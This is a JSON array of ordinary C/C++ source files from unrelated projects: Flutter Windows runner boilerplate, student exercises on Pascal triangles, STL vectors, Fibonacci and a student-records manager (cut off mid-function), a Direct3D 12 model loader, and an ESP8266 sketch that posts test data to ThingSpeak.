[
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"task_elevate\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nvoid hitungpascal(int a, int b, int x, int y, int perulangan, int& bagian1, int& bagian2, int& bagian3) {\r\n    if (perulangan > 2) return;\r\n\r\n    if (perulangan == 0) {\r\n        bagian1 = a * a * x * x;\r\n        hitungpascal(a, b, x, y, perulangan + 1, bagian1, bagian2, bagian3);\r\n    }\r\n    else if (perulangan == 1) {\r\n        bagian2 = 2 * a * b * x * y;\r\n        hitungpascal(a, b, x, y, perulangan + 1, bagian1, bagian2, bagian3);\r\n    }\r\n    else if (perulangan == 2) {\r\n        bagian3 = b * b * y * y;\r\n    }\r\n}\r\n\r\nvoid printpascal(int a, int b, int x, int y) {\r\n    int bagian1 = 0, bagian2 = 0, bagian3 = 0;\r\n\r\n    hitungpascal(a, b, x, y, 0, bagian1, bagian2, bagian3);\r\n\r\n    cout << \"Hasil dari (\" << a << \"x + \" << b << \"y)^2 adalah: \";\r\n    cout << bagian1 << \"x^2\";\r\n\r\n    if (bagian2 != 0) {\r\n        if (bagian2 > 0) cout << \" + \" << bagian2 << \"xy\";\r\n        else cout << \" - \" << -bagian2 << \"xy\";\r\n    }\r\n\r\n    if (bagian3 != 0) {\r\n        if (bagian3 > 0) cout << \" + \" << bagian3 << \"y^2\";\r\n        else cout << \" - \" << -bagian3 << \"y^2\";\r\n    }\r\n    cout << endl;\r\n}\r\n\r\n\r\n\r\nint gambarpascal(int pangkat) {\r\n    if (pangkat == 0) {\r\n        cout << \"1\" << endl;\r\n        return 1;\r\n    } else {\r\n        \r\n        int prev = gambarpascal(pangkat - 1);\r\n        for (int i = 0; i <= pangkat; ++i) {\r\n            if (i == 0 || i == pangkat) {\r\n                cout << \"1 \";\r\n            } else {\r\n                cout << prev * (pangkat - i + 1) / i << \" \";\r\n            }\r\n        }\r\n        cout << endl;\r\n        return 1;\r\n    }\r\n}\r\n\r\nint main() {\r\n    int a, b, x, y, tambahataukurang;\r\n    \r\n    \r\n\r\n    cout << \"Masukkan nilai a (koefisien untuk x): \";\r\n    cin >> a;\r\n    x =1;\r\n    cout << \"Masukkan nilai b (koefisien untuk y): \";\r\n    cin >> b;\r\n    y = 1 ;\r\n    \r\n    gambarpascal(2);\r\n\r\n    printpascal(a, b, x, y);\r\n\r\n    return 0;\r\n}\r\n",
    "/////////////////////////////////////////////////////////////////////////////\n// \u041c\u043e\u0434\u0435\u043b\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043e\u043f\u0442\u0438\u0447\u0435\u0441\u043a\u0438\u0445 \u0441\u0438\u0441\u0442\u0435\u043c\n// \u041b\u0430\u0431\u043e\u0440\u0430\u0442\u043e\u0440\u043d\u0430\u044f \u0440\u0430\u0431\u043e\u0442\u0430 \u211611, \u0432\u0430\u0440\u0438\u0430\u043d\u0442 \u21167\n// \u0418\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u043a\u043e\u043d\u0442\u0435\u0439\u043d\u0435\u0440\u043e\u0432 \u0438 \u0430\u043b\u0433\u043e\u0440\u0438\u0442\u043c\u043e\u0432 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0438 STL\n// - m1=0, m2=100\n// - \u043f\u043e\u0434\u0441\u0447\u0438\u0442\u0430\u0442\u044c \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u0441\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f\u043c\u0438 \u0431\u043e\u043b\u044c\u0448\u0435 10\n// - \u043d\u0430\u0439\u0442\u0438 \u043a\u043e\u0440\u0435\u043d\u044c \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0439 \u0438\u0437 \u0432\u0441\u0435\u0445 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432\n// - \u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c \u0441\u0443\u043c\u043c\u0443 \u0432\u0441\u0435\u0445 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432\n// main.cpp\n// \n// \u0410\u0445\u043c\u0430\u0440\u043e\u0432 \u0420\u0443\u0441\u043b\u0430\u043d\n// \u0423\u043d\u0438\u0432\u0435\u0440\u0441\u0438\u0442\u0435\u0442 \u0418\u0422\u041c\u041e, B34003\n/////////////////////////////////////////////////////////////////////////////\n// \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0430\u0435\u043c \u043c\u043e\u0434\u0443\u043b\u0438\n#include <iostream> // \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u044b\u0439 \u043f\u043e\u0442\u043e\u043a \u0432\u0432\u043e\u0434\u0430/\u0432\u044b\u0432\u043e\u0434\u0430 \u0432 \u043a\u043e\u043d\u0441\u043e\u043b\u044c\n#include <vector> // \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u044f \u0432\u0435\u043a\u0442\u043e\u0440\u0430\n#include <algorithm> // \n#include <ctime> // \n\nusing namespace std; // \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c\u043e\u0435 \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u043e\u0435 \u043f\u0440\u043e\u0441\u0442\u0440\u0430\u043d\u0441\u0442\u0432\u043e \u0438\u043c\u0435\u043d\n/////////////////////////////////////////////////////////////////////////////\n// \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u0439\nvoid fill_rand(vector<double>& data, int size, double min, double max);\nint count_more(vector<double>& data, double num);\ndouble sum_all(vector<double>& data);\ndouble sqrt_all(vector<double>& data);\nvoid print_all(vector<double>& data, int nLine);\n/////////////////////////////////////////////////////////////////////////////\n// \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u0439\n// \u0437\u0430\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u043c\u0438 \u0447\u0438\u0441\u043b\u0430\u043c\u0438\nvoid fill_rand(vector<double>& data, int size, double min, double max)\n{\n    data.resize(size);\n\n    srand((unsigned)clock());\n    for (int i = 0; i < data.size(); ++i)\n    {\n        data[i] = (rand() * (max - min)) / RAND_MAX + min;\n    }\n}\n\nvoid get_rand(double& val) {\n    srand((unsigned)clock());\n    val = (rand() * (100. - 0.)) / RAND_MAX + 0.;\n}\n\n// \u043f\u043e\u0434\u0441\u0447\u0435\u0442 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0430 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u0431\u043e\u043b\u044c\u0448\u0435 \u043a\u0430\u043a\u043e\u0433\u043e-\u0442\u043e \u0447\u0438\u0441\u043b\u0430\nint count_more(vector<double>& data, double num = 10.) {\n    int count = 0;\n    for (auto elem : data) {\n        if (elem > num) {\n            count++;\n        }\n    }\n\n    return count;\n}\n\n// \u043f\u043e\u0434\u0441\u0447\u0435\u0442 \u0441\u0443\u043c\u043c\u044b \u0432\u0441\u0435\u0445 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432\ndouble sum_all(vector<double>& data) {\n    double sum = 0.;\n    for (auto elem : data) {\n        sum += elem;\n    }\n\n    return sum;\n}\n\n// \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u0435 \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u043e\u0433\u043e \u043a\u043e\u0440\u043d\u044f \u0438\u0437 \u0441\u0443\u043c\u043c\u044b \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432\ndouble sqrt_all(vector<double>& data) {\n    double sum;\n    sum = sum_all(data);\n    return sqrt(sum);\n}\n\n// \u0432\u044b\u0432\u043e\u0434 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u043d\u0430 \u044d\u043a\u0440\u0430\u043d\nvoid print_all(vector<double>& data, int nLine = 10) {\n    int count = 1;\n\n    cout << \"[\" << data[0];\n    for (int i = 1; i < data.size(); ++i) {\n        if (count >= nLine) {\n            cout << \",\" << endl << data[i];\n            count = 1;\n        }\n        else {\n            cout << \", \" << data[i];\n            count++;\n        }      \n    }\n    cout << \"]\" << endl;\n}\n/////////////////////////////////////////////////////////////////////////////\n// \u0433\u043b\u0430\u0432\u043d\u0430\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u044f\nint main() {\n    // \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0430\u0435\u043c \u0440\u0443\u0441\u0441\u043a\u0438\u0439 \u044f\u0437\u044b\u043a\n    setlocale(LC_ALL, \"Russian\");\n    \n    // \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u043c \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435\n    double m1 = 0., m2 = 100.;\n    vector<double> data;\n    data.resize(20);\n\n    // \u0437\u0430\u043f\u043e\u043b\u043d\u044f\u0435\u043c \u043c\u0430\u0441\u0441\u0438\u0432 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u043c\u0438 \u0447\u0438\u0441\u043b\u0430\u043c\u0438 \u0438 \u0432\u044b\u0432\u043e\u0434\u0438\u043c \u0432 \u043a\u043e\u043d\u0441\u043e\u043b\u044c\n    //fill_rand(data, 40, m1, m2);\n    for_each(data.begin(), data.end(), get_rand);\n    cout << \"\u0417\u0430\u043f\u043e\u043b\u043d\u0435\u043d\u043d\u044b\u0439 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u043c\u0438 \u0447\u0438\u0441\u043b\u0430\u043c\u0438 \u043c\u0430\u0441\u0441\u0438\u0432 \u0438\u0437 \" << data.size() << \" \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432:\" << endl;\n    print_all(data);\n\n    // \u0432\u044b\u0432\u043e\u0434\u0438\u043c \u043e\u0442\u0432\u0435\u0442\u044b \u043d\u0430 \u043f\u0443\u043d\u043a\u0442\u044b \u0437\u0430\u0434\u0430\u043d\u0438\u044f\n    cout << endl << \"\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u0441\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f\u043c\u0438 \u0431\u043e\u043b\u044c\u0448\u0435 10: \" << count_more(data) << endl;\n    cout << endl << \"\u0421\u0443\u043c\u043c\u0430 \u0432\u0441\u0435\u0445 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432: \" << sum_all(data) << endl;\n    cout << endl << \"\u041a\u043e\u0440\u0435\u043d\u044c \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0439 \u0438\u0437 \u0441\u0443\u043c\u043c\u044b \u0432\u0441\u0435\u0445 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432: \" << sqrt_all(data) << endl;\n}\n/////////////////////////////////////////////////////////////////////////////",
    "\r\n//Question: print out first n fibonacci number using recursion\r\n/* Allah is the best planner.He knows everything*/\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\n \r\n#define pb  push_back\r\n#define fast() ios_base::sync_with_stdio(false);cin.tie(NULL);cout.tie(NULL);\r\n#define en \"\\n\"\r\n\r\ntypedef long long int ll;\r\ntypedef unsigned long long int ull;\r\n  \r\nint fibo(int n)\r\n{\r\n  if(n<=1)\r\n  {\r\n    return n;\r\n  }    \r\n int first= fibo(n-1);\r\n  int last=fibo(n-2); \r\n                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                \r\nreturn first+last;\r\n   \r\n}\r\n  \r\nint main()\r\n{\r\n    int n;\r\n    cin>>n;\r\n    for(int i=0;i<=n;i++)\r\n    {\r\n     cout<<fibo(i)<<\" \";\r\n    }\r\n  \r\n\r\n   return 0;\r\n}",
    "#include<iostream>\n#include<fstream>\n#include<iomanip>\nusing namespace std;\n\n\n//***************************************************************\n//                   CLASS USED IN PROJECT\n//****************************************************************\n\nclass student\n{\n\tint rollno;\n\tchar name[50];\n\tint p_marks, c_marks, m_marks, e_marks, cs_marks;\n\tdouble per;\n\tchar grade;\n\tvoid calculate();\t//function to calculate grade\npublic:\n\tvoid getdata();\t\t//function to accept data from user\n\tvoid showdata() const;\t//function to show data on screen\n\tvoid show_tabular() const;\n\tint retrollno() const;\n}; //class ends here\n\n\nvoid student::calculate()\n{\n\tper=(p_marks+c_marks+m_marks+e_marks+cs_marks)/5.0;\n\tif(per>=60)\n\t\tgrade='A';\n\telse if(per>=50)\n\t\tgrade='B';\n\telse if(per>=33)\n\t\tgrade='C';\n\telse\n\t\tgrade='F';\n}\n\nvoid student::getdata()\n{\n\tcout<<\"\\nEnter The roll number of student \";\n\tcin>>rollno;\n\tcout<<\"\\n\\nEnter The Name of student \";\n\tcin.ignore();\n\tcin.getline(name,50);\n\tcout<<\"\\nEnter The marks in physics out of 100 : \";\n\tcin>>p_marks;\n\tcout<<\"\\nEnter The marks in chemistry out of 100 : \";\n\tcin>>c_marks;\n\tcout<<\"\\nEnter The marks in maths out of 100 : \";\n\tcin>>m_marks;\n\tcout<<\"\\nEnter The marks in english out of 100 : \";\n\tcin>>e_marks;\n\tcout<<\"\\nEnter The marks in computer science out of 100 : \";\n\tcin>>cs_marks;\n\tcalculate();\n}\n\nvoid student::showdata() const\n{\n\tcout<<\"\\nRoll number of student : \"<<rollno;\n\tcout<<\"\\nName of student : \"<<name;\n\tcout<<\"\\nMarks in Physics : \"<<p_marks;\n\tcout<<\"\\nMarks in Chemistry : \"<<c_marks;\n\tcout<<\"\\nMarks in Maths : \"<<m_marks;\n\tcout<<\"\\nMarks in English : \"<<e_marks;\n\tcout<<\"\\nMarks in Computer Science :\"<<cs_marks;\n\tcout<<\"\\nPercentage of student is  :\"<<per;\n\tcout<<\"\\nGrade of student is :\"<<grade;\n}\n\nvoid student::show_tabular() const\n{\n\tcout<<rollno<<setw(6)<<\" \"<<name<<setw(10)<<p_marks<<setw(4)<<c_marks<<setw(4)<<m_marks<<setw(4)\n\t\t<<e_marks<<setw(4)<<cs_marks<<setw(8)<<per<<setw(6)<<grade<<endl;\n}\n\nint  student::retrollno() const\n{\n\treturn rollno;\n}\n\n\n//***************************************************************\n//    \tfunction declaration\n//****************************************************************\n\nvoid write_student();\t//write the record in binary file\nvoid display_all();\t//read all records from binary file\nvoid display_sp(int);\t//accept rollno and read record from binary file\nvoid modify_student(int);\t//accept rollno and update record of binary file\nvoid delete_student(int);\t//accept rollno and delete selected records from binary file\nvoid class_result();\t//display all records in tabular format from binary file\nvoid result();\t\t//display result menu\nvoid intro();\t\t//display welcome screen\nvoid entry_menu();\t//display entry menu on screen\n\n\n//***************************************************************\n//    \tTHE MAIN FUNCTION OF PROGRAM\n//****************************************************************\n\n\nint main()\n{\n\tchar ch;\n\tcout.setf(ios::fixed|ios::showpoint);\n\tcout<<setprecision(2); // program outputs decimal number to two decimal places\n\tintro();\n\tdo\n\t{\n\n\t\tcout<<\"\\n\\n\\n\\tMAIN MENU\";\n\t\tcout<<\"\\n\\n\\t01. RESULT MENU\";\n\t\tcout<<\"\\n\\n\\t02. ENTRY/EDIT MENU\";\n\t\tcout<<\"\\n\\n\\t03. EXIT\";\n\t\tcout<<\"\\n\\n\\tPlease Select Your Option (1-3) \";\n\t\tcin>>ch;\n\t\tswitch(ch)\n\t\t{\n\t\t\tcase '1': result();\n\t\t\t\tbreak;\n\t\t\tcase '2': entry_menu();\n\t\t\t\tbreak;\n\t\t\tcase '3':\n\t\t\t\tbreak;\n\t\t\tdefault :cout<<\"\\a\";\n\t\t}\n    }while(ch!='3');\n\treturn 0;\n}\n\n//***************************************************************\n//    \tfunction to write in file\n//****************************************************************\n\nvoid write_student()\n{\n\tstudent st;\n\tofstream outFile;\n\toutFile.open(\"student.dat\",ios::binary|ios::app);\n\tst.getdata();\n\toutFile.write(reinterpret_cast<char *> (&st), sizeof(student));\n\toutFile.close();\n    \tcout<<\"\\n\\nStudent record Has Been Created \";\n\tcin.ignore();\n\tcin.get();\n}\n\n//***************************************************************\n//    \tfunction to read all records from file\n//****************************************************************\n\nvoid display_all()\n{\n\tstudent st;\n\tifstream inFile;\n\tinFile.open(\"student.dat\",ios::binary);\n\tif(!inFile)\n\t{\n\t\tcout<<\"File could not be open !! Press any Key...\";\n\t\tcin.ignore();\n\t\tcin.get();\n\t\treturn;\n\t}\n\tcout<<\"\\n\\n\\n\\t\\tDISPLAY ALL RECORD !!!\\n\\n\";\n\twhile(inFile.read(reinterpret_cast<char *> (&st), sizeof(student)))\n\t{\n\t\tst.showdata();\n\t\tcout<<\"\\n\\n====================================\\n\";\n\t}\n\tinFile.close();\n\tcin.ignore();\n\tcin.get();\n}\n\n//***************************************************************\n//    \tfunction to read specific record from file\n//****************************************************************\n\nvoid display_sp(int n)\n{\n\tstudent st;\n\tifstream inFile;\n\tinFile.open(\"student.dat\",ios::binary);\n\tif(!inFile)\n\t{\n\t\tcout<<\"File could not be open !! Press any Key...\";\n\t\tcin.ignore();\n\t\tcin.get();\n\t\treturn;\n\t}\n\tbool flag=false;\n\twhile(inFile.read(reinterpret_cast<char *> (&st), sizeof(student)))\n\t{\n\t\tif(st.r",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"Model.h\"\n\n#include <assimp/scene.h>\n#include <assimp/Importer.hpp>\n#include <assimp/postprocess.h>\n\nModel::Model(const std::string& filepath, Device& device)\n{\n    Assimp::Importer importer;\n    importer.ReadFile(filepath, aiProcess_Triangulate | aiProcess_GenNormals);\n    const auto scene = importer.GetScene();\n\n    if(!scene)\n        throw std::exception(\"Failed to load model!\");\n\n    std::vector<float> vertices;\n    std::vector<float> normals;\n    std::vector<uint32_t> indices;\n    uint32_t indexOffset = 0;\n    for(auto meshIndex = 0u; meshIndex < scene->mNumMeshes; ++meshIndex)\n    {\n        const auto& mesh = scene->mMeshes[meshIndex];\n        vertices.insert(vertices.end(), (float*)mesh->mVertices, (float*)(mesh->mVertices + mesh->mNumVertices));\n        normals.insert(normals.end(), (float*)mesh->mNormals, (float*)(mesh->mNormals + mesh->mNumVertices));\n\n        for(auto faceIndex = 0u; faceIndex < mesh->mNumFaces; ++faceIndex)\n        {\n            const auto& face = mesh->mFaces[faceIndex];\n            assert(face.mNumIndices == 3);\n\n            indices.push_back(face.mIndices[0] + indexOffset);\n            indices.push_back(face.mIndices[1] + indexOffset);\n            indices.push_back(face.mIndices[2] + indexOffset);\n        }\n\n        indexOffset = (uint32_t)vertices.size() / 3;\n    }\n\n    m_vertexBuffer = device.CreateVertexBuffer(vertices);\n    m_normalBuffer = device.CreateVertexBuffer(normals);\n    m_indexBuffer = device.CreateIndexBuffer(indices);\n    m_vertexCount = (uint32_t)vertices.size() / 3;\n    m_indexCount = (uint32_t)indices.size();\n\n    m_blas = device.CreateBottomLevelAccelerationStructure(m_vertexBuffer, m_indexBuffer, m_vertexCount, m_indexCount);\n}\n\nvoid Model::Draw(const ComPtr<ID3D12GraphicsCommandList>& commandList, uint32_t instanceId) const\n{\n    commandList->SetGraphicsRoot32BitConstant(2, instanceId, 0);\n    std::array vertexBufferViews = {m_vertexBuffer.View, m_normalBuffer.View};\n    commandList->IASetVertexBuffers(0, (UINT)vertexBufferViews.size(), vertexBufferViews.data());\n    commandList->IASetIndexBuffer(&m_indexBuffer.View);\n    commandList->DrawIndexedInstanced(m_indexCount, 1, 0, 0, 0);\n}\n\nvoid Model::DrawInstanced(const ComPtr<ID3D12GraphicsCommandList>& commandList, uint32_t instanceCount) const\n{\n    std::array vertexBufferViews = {m_vertexBuffer.View, m_normalBuffer.View};\n    commandList->IASetVertexBuffers(0, (UINT)vertexBufferViews.size(), vertexBufferViews.data());\n    commandList->IASetIndexBuffer(&m_indexBuffer.View);\n    commandList->DrawIndexedInstanced(m_indexCount, instanceCount, 0, 0, 0);\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_tutorial\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"fitness_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n * ThingSpeak Test Code for ESP8266 with WiFiManager\n * Author: Varad Chaskar\n * Description: This code tests ThingSpeak communication after connecting to WiFi using WiFiManager. \n * It sends test data to a ThingSpeak channel.\n * Date: January 28, 2024\n */\n\n#include <WiFiManager.h>        // WiFiManager library for handling WiFi connections easily\n#include <ESP8266WiFi.h>        // ESP8266 WiFi library for network communication\n#include \"ThingSpeak.h\"         // ThingSpeak library for cloud communication\n\nWiFiClient client;              // WiFi client object to communicate with ThingSpeak\n\n// ThingSpeak channel and API key (Replace with your actual channel number and API key)\nunsigned long myChannelNumber = 2384399;  // Your ThingSpeak channel number\nconst char *myWriteAPIKey = \"ELW2NF5Q83OGB39G\";  // Your ThingSpeak write API key\n\n// Pin configuration for built-in LED on the ESP8266 board\nconst int LED_PIN = LED_BUILTIN;\n\nvoid setup() {\n  // Configure the built-in LED as an output to provide visual feedback on connection status\n  pinMode(LED_PIN, OUTPUT);\n\n  // Initialize serial communication at 115200 baud for debugging and monitoring output\n  Serial.begin(115200);\n\n  // Create an instance of WiFiManager to handle the WiFi connection process\n  WiFiManager wm;\n\n  // Print message to serial console for debugging and tracking progress\n  Serial.println(\"Starting WiFiManager for ThingSpeak Test...\");\n\n  // Attempt to connect to WiFi using saved credentials (auto-connect mode)\n  bool connected = wm.autoConnect(\"ASAA\");\n\n  // Check if WiFi connection was successful\n  if (!connected) {\n    // If connection fails, print an error message to the serial monitor\n    Serial.println(\"Failed to connect to WiFi.\");\n\n    // Blink the built-in LED to visually indicate connection failure\n    digitalWrite(LED_PIN, HIGH);  // Turn LED on\n    delay(1000);                  // Wait for 1 second\n    digitalWrite(LED_PIN, LOW);   // Turn LED off\n    delay(1000);                  // Wait for 1 second\n    digitalWrite(LED_PIN, HIGH);  // Turn LED on again\n\n    // Restart the ESP8266 after a failed connection attempt to retry WiFi setup\n    ESP.restart();\n  } else {\n    // If successfully connected to WiFi, print a success message to the serial monitor\n    Serial.println(\"Connected to WiFi!\");\n\n    // Turn off the built-in LED to indicate successful WiFi connection\n    digitalWrite(LED_PIN, LOW);\n\n    // Initialize ThingSpeak communication with the WiFi client\n    ThingSpeak.begin(client);\n    Serial.println(\"ThingSpeak Initialized.\");\n  }\n}\n\nvoid loop() {\n  // Test data to send to ThingSpeak\n  float testValue = random(20, 30);  // Generate a random value between 20 and 30\n\n  // Print the value being sent to ThingSpeak\n  Serial.print(\"Sending test value: \");\n  Serial.println(testValue);\n\n  // Write the test value to field 1 of the ThingSpeak channel\n  int responseCode = ThingSpeak.writeField(myChannelNumber, 1, testValue, myWriteAPIKey);\n\n  // Check if data was sent successfully\n  if (responseCode == 200) {\n    Serial.println(\"Data sent successfully to ThingSpeak.\");\n  } else {\n    Serial.print(\"Failed to send data to ThingSpeak. HTTP error code: \");\n    Serial.println(responseCode);\n  }\n\n  // Wait for 20 seconds before sending the next data point (ThingSpeak allows updates every 15 seconds)\n  delay(20000);\n}\n",
